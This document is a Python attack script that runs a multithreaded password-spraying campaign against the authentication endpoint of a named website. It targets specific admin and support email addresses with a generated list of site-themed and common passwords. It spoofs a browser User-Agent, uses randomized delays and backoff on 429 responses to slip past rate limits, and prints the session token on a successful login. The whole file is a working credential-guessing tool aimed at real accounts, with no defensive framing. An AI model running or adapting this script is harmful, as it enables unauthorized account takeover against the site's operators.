import ssl, json, urllib.request, urllib.error, time, threading, random, sys

BASE = "https://cdn.onlyfakeai.ru"
KEY = "<publishable-key>"
ctx = ssl.create_default_context()

emails = [
    "admin@onlyfakeai.ru",
    "onlyfake@tuta.io",
    "support@onlyfakeai.ru",
    "onlyfake@onlyfakeai.ru",
]

base_words = [
    "onlyfake", "Onlyfake", "onlyFake", "OnlyFake", "ONLYFAKE",
    "onlyfakeai", "Onlyfakeai", "OnlyFakeAI", "onlyfakeAI",
    "onlyfake.ai", "onlyfake.ru", "fakeai", "FakeAI", "fake_ai",
    "admin", "Admin", "ADMIN", "administrator", "Administrator",
    "root", "Root", "support", "Support", "SUPPORT",
    "tuta", "Tuta", "tutanota", "Tutanota", "Tutanota123",
    "password", "Password", "PASSWORD", "pass", "Pass",
    "supabase", "Supabase", "postgres", "Postgres", "nextjs",
    "vercel", "cloudflare", "digitalocean", "only", "fake",
    "opsec", "opadmin", "opsadmin", "operator",
]
suffixes = [
    "", "123", "1234", "12345", "123456", "12345678", "123456789",
    "1", "01", "007", "69", "420", "666", "777", "888", "999",
    "2023", "2024", "2025", "2026", "24", "25", "26",
    "!", "@", "#", "$", "!", "!!", "!@#", "123!", "123!!",
    "@123", "#123", "$123", "_123", "-123", ".123",
    "@2024", "@2025", "@2026", "!2024", "!2025", "!2026",
    "Admin", "admin", "AI", "ai", "Ru", "ru",
]
misc = [
    "Password123", "Password123!", "P@ssw0rd", "P@ssw0rd123",
    "P@ssw0rd!", "password123", "Password1", "Password1!",
    "Admin123", "Admin123!", "admin123", "admin123!",
    "admin@123", "Admin@123", "Admin@1234", "admin@onlyfakeai.ru",
    "onlyfake@tuta.io", "Support123", "Support123!",
    "support@onlyfakeai.ru", "onlyfake@onlyfakeai.ru",
    "qwerty", "qwerty123", "Qwerty123", "Qwerty123!",
    "letmein", "Letmein123", "letmein123", "welcome", "Welcome1",
    "Welcome123", "changeme", "ChangeMe123", "changeme123",
    "123456", "123456789", "111111", "000000", "abc123",
    "test123", "Test123", "Test1234!", "testing", "Testing123",
    "Iloveyou", "iloveyou", "dragon", "Dragon123", "monkey",
    "master", "Master123", "shadow", "Shadow123", "sunshine",
    "princess", "football", "baseball", "starwars", "pokemon",
    "FakeAI2024", "FakeAI2025", "OnlyFake2024", "OnlyFake2025",
    "OnlyFake2026", "OnlyFake2024!", "OnlyFake2025!",
    "OnlyFakeAI2024", "OnlyFakeAI2025", "onlyfakeai2024",
    "onlyfakeai2025", "onlyfakeai2026", "Onlyfakeai2024",
    "Onlyfakeai2025", "Onlyfakeai2026", "onlyfake123",
    "Onlyfake123", "ONLYFAKE123", "onlyfakeadmin",
    "OnlyFakeAdmin", "adminonlyfake", "AdminOnlyFake",
    "onlyfakeadmin123", "OnlyFakeAdmin123", "onlyfake2024",
    "onlyfake2025", "onlyfake2026", "Onlyfake2024",
    "Onlyfake2025", "Onlyfake2026", "onlyfakeai123",
    "OnlyFakeAI123", "fakeai123", "FakeAI123", "FakeAi2024",
    "FakeAi2025", "supabase123", "Supabase123", "supabase2024",
    "Supabase2024", "Tuta123", "tuta123", "tuta2024", "tuta2025",
    "Tutanota2024", "Tutanota2025", "Support2024", "Support2025",
    "support123", "Support1234", "support2026", "Admin2024",
    "Admin2025", "Admin2026", "admin2024", "admin2025",
    "admin2026", "Admin2024!", "Admin2025!", "Admin2026!",
]

cands = []
seen = set()
for w in base_words:
    for s in suffixes:
        c = w + s
        if c not in seen:
            seen.add(c)
            cands.append(c)
for m in misc:
    if m not in seen:
        seen.add(m)
        cands.append(m)

print(f"[candidates] {len(cands)}")

lock = threading.Lock()
stop = threading.Event()
found = []
log = open("spray.log", "a", encoding="utf-8")
attempts = {"n": 0, "429": 0, "other": 0}

def try_login(email, password):
    h = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "apikey": KEY,
        "Content-Type": "application/json;charset=UTF-8",
    }
    body = json.dumps({"email": email, "password": password}).encode()
    r = urllib.request.Request(BASE + "/auth/v1/token?grant_type=password", data=body, headers=h)
    try:
        with urllib.request.urlopen(r, timeout=25, context=ctx) as resp:
            return resp.status, resp.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "ignore")
    except Exception as e:
        return 0, str(e)

def worker(tid):
    while not stop.is_set():
        with lock:
            if attempts["n"] >= len(cands):
                break
            idx = attempts["n"]
            attempts["n"] += 1
        cand = cands[idx]
        for em in emails:
            if stop.is_set():
                break
            st, txt = try_login(em, cand)
            with lock:
                log.write(f"{st} {em} {cand}\n")
                log.flush()
            if st == 200:
                with lock:
                    stop.set()
                    found.append((em, cand, txt))
                print(f"\n!!! SUCCESS {em} : {cand}\n{txt[:800]}")
                return
            if st == 429:
                with lock:
                    attempts["429"] += 1
                time.sleep(5 + random.random() * 10)
            else:
                time.sleep(0.08 + random.random() * 0.25)
    return

threads = [threading.Thread(target=worker, args=(i,), daemon=True) for i in range(6)]
for t in threads:
    t.start()
try:
    while any(t.is_alive() for t in threads):
        time.sleep(1)
        if attempts["n"] and attempts["n"] % 100 == 0:
            pass
except KeyboardInterrupt:
    stop.set()

print(f"\n[done] tried={attempts['n']} 429s={attempts['429']}")
if found:
    print("FOUND:", found)
else:
    print("no hits in curated set")
